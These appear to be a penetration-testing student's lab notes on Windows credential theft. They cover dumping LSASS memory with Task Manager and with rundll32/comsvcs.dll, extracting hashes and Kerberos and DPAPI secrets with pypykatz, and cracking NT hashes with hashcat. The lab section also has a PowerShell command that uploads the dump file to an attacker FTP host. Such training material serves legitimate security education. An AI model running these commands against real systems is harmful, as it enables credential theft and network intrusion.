- LSASS [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) is a core Windows process responsible for **enforcing security policies, handling user authentication, and storing sensitive credential material in memory.**
- Upon **initial logon**, LSASS will:
	- **Cache credentials locally in memory**
	- Create **[access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)**
	- Enforce security policies
	- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

# Dumping LSASS process memory
---
- Similar to the process of attacking the SAM database, it would be wise for us first to create a **==copy of the contents of LSASS process memory via the generation of a memory dump.==**

## Task Manager method
- With access to an interactive graphical session on the target, we can use **task manager to create a memory dump.** This requires us to:
	1. **Open `Task Manager`**
	2. **Select the `Processes` tab**
	3. Find and **right click the `Local Security Authority Process`**
	4. **Select `Create dump file`**
1. A file **called `lsass.DMP`** is created and saved in `%temp%`. 
2. This is the file **we will transfer to our attack host.** 

## Rundll32.exe & Comsvcs.dll method - NoGUI req
-  **We must first determine what process ID (`PID`) is assigned to `lsass.exe`**. This can be done from cmd or PowerShell:
- From CMD:
	- `tasklist /svc | findstr lsass.exe`
	- ![[Pasted image 20250630050144.png]]
- From Powershell:
	- `Get-Process lsass`
	- ![[Pasted image 20250630050213.png]]
- Creating a dump file using PowerShell:
	- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full`
	- With this command, we are running `rundll32.exe` to **call an exported function of `comsvcs.dll`** which also **calls the MiniDumpWriteDump** (`MiniDump`) function to **dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).**
	- Most AV tools recognize this as malicious activity and prevent the command from executing.
	- We can proceed t**o transfer the file onto our attack box** to attempt to extract any credentials.

# Using Pypykatz to extract credentials
---
- We can use a powerful tool called ==**[pypykatz](https://github.com/skelsec/pypykatz) to extract credentials from the `.dmp` file.**==
- Pypykatz is an **implementation of Mimikatz written entirely in Python.**
- Python allows us **to run it on Linux-based attack hosts.**
- ==**LSASS stores credentials that have active logon sessions== on Windows systems.** 
- When we dumped LSASS process memory into the file, we essentially took a **"snapshot" of what was in memory** at that point in time.
- If there were any active logon sessions, **==the credentials used to establish them will be present.==**

## Running Pypykatz
- `pypykatz lsa minidump /path/to/lsass.dmp`

## Output Explanation
- **MSV**
	- [MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that ==**LSA calls on to validate logon attempts against the SAM database.**== 
	- Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes **associated with the bob user account's logon session ==stored in LSASS process memory.==**
	- ![[Pasted image 20250630051237.png]]
- **WDIGEST**
	- ![[Pasted image 20250630051358.png]]
	- `WDIGEST` is an **older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`.**
	- LSASS **==caches credentials used by WDIGEST in clear-text.==**
- **Kerberos**
	- ![[Pasted image 20250630051505.png]]
	- [Kerberos](https://web.mit.edu/kerberos/#what_is) is a network **authentication protocol used by Active Directory** in Windows Domain environments. Domain user accounts are g**ranted tickets upon authentication with Active Directory.**
	- This ticket is used to allow the user to **access shared resources on the network** that they have been granted access to without needing to type their credentials each time.
	- LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos.
- **DPAPI**
	- ![[Pasted image 20250630051613.png]]
	- Mimikatz and Pypykatz can extract the **DPAPI `masterkey` for logged-on users** whose data is present in **LSASS process memory.**
	- **==These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI==** and result in the capturing of credentials for various accounts. 
	- DPAPI attack techniques are covered in greater detail in the [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) module.

# Cracking the NT Hash with Hashcat
---
- `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt`

# Lab
---
- Dump LSASS using task manager
- Transfer using FTP Method:
	- `python3 -m pyftpdlib --port 21 --write` => On Linux
	- `(New-Object Net.WebClient).UploadFile('ftp://10.10.15.93/ftp-hosts', '.\lsass.DMP')` => On Windows
	- Pypykatz => `pypykatz lsa minidump lsass.dmp ` and crack
		- `hashcat  -m 1000 vendor.hash /usr/share/wordlists/rockyou.txt`